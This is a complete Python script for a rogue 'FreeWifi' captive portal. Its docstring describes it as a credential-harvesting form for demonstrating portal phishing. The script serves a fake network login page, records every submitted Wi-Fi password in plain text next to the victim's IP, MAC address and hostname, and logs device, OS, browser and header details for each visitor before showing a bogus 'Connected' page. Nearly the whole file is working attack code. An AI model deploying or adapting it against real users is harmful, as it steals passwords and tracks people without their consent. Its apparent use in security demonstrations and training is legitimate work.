#!/usr/bin/env python3

"""Login captive portal for FreeWifi AP (--secure mode).
Presents a credential-harvesting login form to demonstrate portal phishing.
Usage: python3 portal.py [ap_ip] [log_file] [lease_file]
"""

import html as _html
import http.server
import os
import re
import socketserver
import sys
import urllib.parse
from datetime import datetime

_HERE = os.path.dirname(os.path.abspath(__file__))
IMAGE_PATH = os.path.join(_HERE, "image.jpg")

PORT = 80
AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.50.1"
LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else None
LEASE_FILE = sys.argv[3] if len(sys.argv) > 3 else None
SSID = sys.argv[4] if len(sys.argv) > 4 else "FreeWifi"
_SSID_HTML = _html.escape(SSID)
BOLD = "\033[1m"
RED = "\033[91m"
RESET = "\033[0m"
SEEN_CLIENTS: set = set()

_COMMON_CSS = """\
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        html { background: #000; }

        body {
            background: #000;
            color: #00ff41;
            font-family: "Courier New", Courier, monospace;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: repeating-linear-gradient(
                0deg,
                rgba(0,0,0,.13) 0px,
                rgba(0,0,0,.13) 1px,
                transparent 1px,
                transparent 3px
            );
            pointer-events: none;
            z-index: 1000;
        }

        .hero {
            position: relative;
            width: 100%;
            height: 42vh;
            overflow: hidden;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            padding-bottom: 32px;
        }

        .hero-img {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: center 18%;
            filter: grayscale(38%) contrast(1.14) brightness(0.66);
            animation: img-glitch 12s infinite;
        }

        .hero::before {
            content: "";
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(
                0deg,
                rgba(0,0,0,.28) 0px,
                rgba(0,0,0,.28) 1px,
                transparent 1px,
                transparent 4px
            );
            z-index: 2;
            pointer-events: none;
        }

        .hero::after {
            content: "";
            position: absolute;
            inset: 0;
            background:
                radial-gradient(ellipse at center, transparent 32%, rgba(0,0,0,.88) 100%),
                linear-gradient(180deg, rgba(0,0,0,.45) 0%, transparent 25%, transparent 55%, rgba(0,0,0,.95) 100%);
            z-index: 3;
            pointer-events: none;
        }

        .tagline {
            position: relative;
            z-index: 5;
            font-size: clamp(16px, 2.8vw, 28px);
            letter-spacing: .22em;
            text-transform: lowercase;
            color: #00ff41;
            text-shadow:
                0 0 12px rgba(0,255,65,.95),
                0 0 36px rgba(0,255,65,.45);
            animation: tag-pulse 3.5s ease-in-out infinite;
        }

        .panel {
            max-width: 480px;
            margin: 0 auto;
            padding: 52px 28px 72px;
        }

        .dim { color: rgba(0,255,65,.38); font-size: clamp(12px,1.8vw,14px); line-height: 2.1; }
        .dim::before { content: "> "; }

        h1 {
            font-size: clamp(28px,5vw,48px);
            font-weight: 400;
            line-height: 1.1;
            color: #00ff41;
            text-shadow: 0 0 22px rgba(0,255,65,.55), 0 0 60px rgba(0,255,65,.18);
            margin: 20px 0 8px;
        }

        .sub {
            color: rgba(0,255,65,.55);
            font-size: clamp(12px,1.8vw,14px);
            margin-bottom: 32px;
        }

        .rule { border: none; border-top: 1px solid rgba(0,255,65,.18); margin: 28px 0; }

        .footer {
            margin-top: 28px;
            font-size: clamp(10px,1.4vw,12px);
            color: rgba(0,255,65,.25);
            letter-spacing: .05em;
        }

        .cursor {
            display: inline-block;
            width: 9px; height: .9em;
            background: #00ff41;
            vertical-align: text-bottom;
            margin-left: 3px;
            box-shadow: 0 0 8px rgba(0,255,65,.8);
            animation: blink 1.1s step-end infinite;
        }

        @keyframes blink {
            0%,100% { opacity: 1; }
            50%      { opacity: 0; }
        }

        @keyframes tag-pulse {
            0%,100% { text-shadow: 0 0 12px rgba(0,255,65,.95), 0 0 36px rgba(0,255,65,.45); }
            50%      { text-shadow: 0 0 18px rgba(0,255,65,1),   0 0 52px rgba(0,255,65,.6);  }
        }

        @keyframes img-glitch {
            0%, 86%, 100% {
                transform: translate(0);
                filter: grayscale(38%) contrast(1.14) brightness(0.66);
            }
            87% {
                transform: translate(-6px, 2px);
                filter: grayscale(75%) contrast(1.45) brightness(0.52) hue-rotate(85deg);
            }
            87.6% {
                transform: translate(6px, -2px);
                filter: grayscale(15%) contrast(1.05) brightness(0.88) saturate(2);
            }
            88.2% {
                transform: translate(0);
                filter: grayscale(38%) contrast(1.14) brightness(0.66);
            }
            93% {
                transform: translate(4px, 1px);
                filter: grayscale(95%) contrast(1.6) brightness(0.5);
            }
            93.6% {
                transform: translate(0);
                filter: grayscale(38%) contrast(1.14) brightness(0.66);
            }
        }
"""

LOGIN_PAGE = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{_SSID_HTML} &mdash; Network Access</title>
    <style>
{_COMMON_CSS}
        .login-form {{ display: flex; flex-direction: column; gap: 20px; }}

        .field {{ display: flex; flex-direction: column; gap: 6px; }}

        label {{
            font-size: clamp(11px,1.6vw,13px);
            color: rgba(0,255,65,.6);
            letter-spacing: .08em;
            text-transform: uppercase;
        }}

        input[type="password"] {{
            background: rgba(0,255,65,.05);
            border: 1px solid rgba(0,255,65,.3);
            color: #00ff41;
            font-family: inherit;
            font-size: clamp(14px,2vw,16px);
            padding: 12px 14px;
            outline: none;
            transition: border-color .2s, box-shadow .2s;
            width: 100%;
        }}

        input[type="password"]:focus {{
            border-color: rgba(0,255,65,.8);
            box-shadow: 0 0 0 2px rgba(0,255,65,.15);
        }}

        input::placeholder {{ color: rgba(0,255,65,.25); }}

        button[type="submit"] {{
            margin-top: 8px;
            background: rgba(0,255,65,.12);
            border: 1px solid rgba(0,255,65,.5);
            color: #00ff41;
            font-family: inherit;
            font-size: clamp(14px,2vw,16px);
            letter-spacing: .12em;
            padding: 14px;
            cursor: pointer;
            text-transform: uppercase;
            transition: background .2s, box-shadow .2s;
        }}

        button[type="submit"]:hover {{
            background: rgba(0,255,65,.22);
            box-shadow: 0 0 18px rgba(0,255,65,.3);
        }}
    </style>
</head>
<body>
    <section class="hero" aria-label="{_SSID_HTML} network">
        <img class="hero-img" src="/image.jpg" alt="network access">
    </section>

    <section class="panel" aria-label="Network access">
        <p class="dim">network key required&hellip;</p>
        <p class="dim">enter wifi password to continue.</p>
        <h1>{_SSID_HTML}</h1>
        <p class="sub">This network requires a password to access the internet.</p>
        <hr class="rule">
        <form method="POST" action="/login" class="login-form">
            <div class="field">
                <label for="password">Wi-Fi Password</label>
                <input type="password" id="password" name="password"
                       autocomplete="off"
                       placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
            </div>
            <button type="submit">Connect &rarr;</button>
        </form>
        <p class="footer">
            By connecting you agree to our terms of service.
            <span class="cursor" aria-hidden="true"></span>
        </p>
    </section>
</body>
</html>
"""

CONNECTED_PAGE = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{_SSID_HTML} &mdash; Connected</title>
    <style>
{_COMMON_CSS}
        .ok {{ color: #00ff41; }}
    </style>
</head>
<body>
    <section class="hero" aria-label="FreeWifi network">
        <img class="hero-img" src="/image.jpg" alt="network access">
        <p class="tagline">connected</p>
    </section>

    <section class="panel" aria-label="Connection status">
        <p class="dim">authentication successful&hellip;</p>
        <p class="dim">session established.</p>
        <h1><span class="ok">&#x2713;</span> Connected</h1>
        <p class="sub">You are now connected to {_SSID_HTML}.</p>
        <hr class="rule">
        <p style="font-size:clamp(13px,2vw,15px); line-height:1.8; color:rgba(0,255,65,.7);">
            Open your browser and start browsing.<br>
            If a page does not load, try refreshing.
        </p>
        <p class="footer">session active<span class="cursor" aria-hidden="true"></span></p>
    </section>
</body>
</html>
"""

LOGIN_BYTES = LOGIN_PAGE.encode()
CONNECTED_BYTES = CONNECTED_PAGE.encode()


def clean(value):
    return " ".join(str(value).replace("\x00", "").split())


def log_event(message):
    line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    if not LOG_FILE:
        print(line, flush=True)
        return
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError as exc:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] portal log error: {exc}", flush=True)


def lease_for_ip(ip):
    if not LEASE_FILE:
        return {"mac": "unknown", "hostname": "unknown", "client_id": "unknown"}
    try:
        with open(LEASE_FILE, encoding="utf-8") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 5 and parts[2] == ip:
                    return {"mac": parts[1], "hostname": parts[3], "client_id": parts[4]}
    except OSError:
        pass
    return {"mac": "unknown", "hostname": "unknown", "client_id": "unknown"}


def user_agent_info(user_agent):
    ua = user_agent or ""
    webkit_match = re.search(r"AppleWebKit/([0-9.]+)", ua)
    webkit = webkit_match.group(1) if webkit_match else "unknown"
    chrome_match = re.search(r"(?:Chrome|CriOS)/([0-9.]+)", ua)
    chrome = chrome_match.group(1) if chrome_match else "unknown"

    if "iPhone" in ua:
        device = "iPhone"
        os_match = re.search(r"OS ([0-9_]+)", ua)
        os_name = f"iOS {os_match.group(1).replace('_', '.')}" if os_match else "iOS"
        browser_engine = f"AppleWebKit {webkit}" if webkit != "unknown" else "unknown"
    elif "iPad" in ua:
        device = "iPad"
        os_match = re.search(r"OS ([0-9_]+)", ua)
        os_name = f"iPadOS {os_match.group(1).replace('_', '.')}" if os_match else "iPadOS"
        browser_engine = f"AppleWebKit {webkit}" if webkit != "unknown" else "unknown"
    elif "Android" in ua:
        android_match = re.search(r"Android ([^;)\s]+)", ua)
        model_match = re.search(r"Android [^;]+; ([^;)]+)", ua)
        device = model_match.group(1).strip() if model_match else "Android"
        os_name = f"Android {android_match.group(1)}" if android_match else "Android"
        browser_engine = f"Chromium {chrome}" if chrome != "unknown" else "unknown"
    elif "Windows NT" in ua:
        device = "Windows PC"
        os_name = "Windows"
        browser_engine = f"Chromium {chrome}" if chrome != "unknown" else "unknown"
    elif "Macintosh" in ua:
        device = "Mac"
        mac_match = re.search(r"Mac OS X ([0-9_]+)", ua)
        os_name = f"macOS {mac_match.group(1).replace('_', '.')}" if mac_match else "macOS"
        browser_engine = f"AppleWebKit {webkit}" if webkit != "unknown" else "unknown"
    elif "Linux" in ua:
        device = "Linux"
        os_name = "Linux"
        browser_engine = f"Chromium {chrome}" if chrome != "unknown" else "unknown"
    else:
        device = "unknown"
        os_name = "unknown"
        browser_engine = "unknown"

    return device, os_name, browser_engine


def console_client(ip, mac, device, os_name, browser_engine):
    key = (ip, mac, device, os_name, browser_engine)
    if key in SEEN_CLIENTS:
        return
    SEEN_CLIENTS.add(key)
    print(
        f"[{datetime.now().strftime('%H:%M:%S')}] CONNECTED "
        f"device={BOLD}{device}{RESET}  ip={ip}  mac={mac}  "
        f"os={os_name}  browser_engine={browser_engine}",
        flush=True,
    )


class LoginHandler(http.server.BaseHTTPRequestHandler):
    def _fingerprint(self):
        parsed = urllib.parse.urlsplit(self.path)
        headers_str = "; ".join(
            f"{clean(n)}={clean(v)}" for n, v in self.headers.items()
        ) or "none"
        user_agent = clean(self.headers.get("User-Agent", "unknown"))
        language = clean(self.headers.get("Accept-Language", "unknown"))
        host = clean(self.headers.get("Host", "unknown"))
        lease = lease_for_ip(self.client_address[0])
        device, os_name, browser_engine = user_agent_info(user_agent)
        if device == "unknown" and lease["hostname"] not in ("", "*", "unknown"):
            device = lease["hostname"]
        log_event(
            "PORTAL_REQUEST "
            f"ip={self.client_address[0]}  "
            f"mac={lease['mac']}  "
            f"hostname={lease['hostname']}  "
            f"client_id={lease['client_id']}  "
            f"device={device}  "
            f"os={os_name}  "
            f"browser_engine={browser_engine}  "
            f"method={self.command}  "
            f"path={clean(parsed.path or '/')}  "
            f"query={clean(parsed.query or '-')}  "
            f"host={host}  "
            f"user_agent={user_agent}  "
            f"accept_language={language}  "
            f'headers="{headers_str}"'
        )
        return lease, device, os_name, browser_engine

    def _log_credentials(self, password):
        ip = self.client_address[0]
        lease = lease_for_ip(ip)
        mac = lease["mac"]
        hostname = lease["hostname"]
        if hostname in ("*", "unknown", ""):
            ua = clean(self.headers.get("User-Agent", ""))
            device, os_name, _ = user_agent_info(ua)
            hostname = f"{device} ({os_name})" if device != "unknown" else "unknown"
        log_event(
            "CREDENTIAL_CAPTURE "
            f"ip={ip}  mac={mac}  hostname={hostname}  "
            f"wifi_password={repr(password)}"
        )
        print(
            f"\n[{datetime.now().strftime('%H:%M:%S')}] "
            f"{BOLD}{RED}CREDENTIAL_CAPTURE{RESET}  "
            f"ip={ip}  mac={mac}  hostname={hostname}\n"
            f"    wifi_password = {BOLD}{password}{RESET}\n",
            flush=True,
        )

    def _send_page(self, body: bytes, status: int = 200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _send_image(self):
        try:
            size = os.path.getsize(IMAGE_PATH)
            fh = open(IMAGE_PATH, "rb")
        except OSError:
            self.send_error(404)
            return
        with fh:
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(size))
            self.send_header("Cache-Control", "public, max-age=3600")
            self.end_headers()
            while True:
                chunk = fh.read(64 * 1024)
                if not chunk:
                    break
                self.wfile.write(chunk)

    def _redirect(self, location: str):
        self.send_response(302)
        self.send_header("Location", location)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def do_GET(self):
        lease, device, os_name, browser_engine = self._fingerprint()
        console_client(
            self.client_address[0], lease["mac"],
            device, os_name, browser_engine,
        )
        parsed = urllib.parse.urlsplit(self.path)
        if parsed.path == "/image.jpg":
            self._send_image()
        elif parsed.path == "/connected":
            self._send_page(CONNECTED_BYTES)
        else:
            self._send_page(LOGIN_BYTES)

    def do_HEAD(self):
        self._fingerprint()
        parsed = urllib.parse.urlsplit(self.path)
        if parsed.path == "/image.jpg":
            try:
                size = os.path.getsize(IMAGE_PATH)
            except OSError:
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(size))
            self.send_header("Cache-Control", "public, max-age=3600")
            self.end_headers()
            return
        body = CONNECTED_BYTES if parsed.path == "/connected" else LOGIN_BYTES
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw_body = self.rfile.read(length).decode("utf-8", errors="replace") if length > 0 else ""
        self._fingerprint()

        parsed_path = urllib.parse.urlsplit(self.path).path
        if parsed_path == "/login":
            params = urllib.parse.parse_qs(raw_body, keep_blank_values=True)
            password = clean(params.get("password", [""])[0])[:256]
            self._log_credentials(password)
            self._redirect(f"http://{AP_IP}/connected")
        else:
            self._send_page(LOGIN_BYTES)

    def log_message(self, fmt, *args):
        log_event(f"PORTAL_HTTP ip={self.client_address[0]}  message=\"{clean(fmt % args)}\"")


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


if __name__ == "__main__":
    with ReusableTCPServer(("", PORT), LoginHandler) as httpd:
        print(f"[+] Login captive portal on :{PORT}  (AP: {AP_IP})")
        httpd.serve_forever()
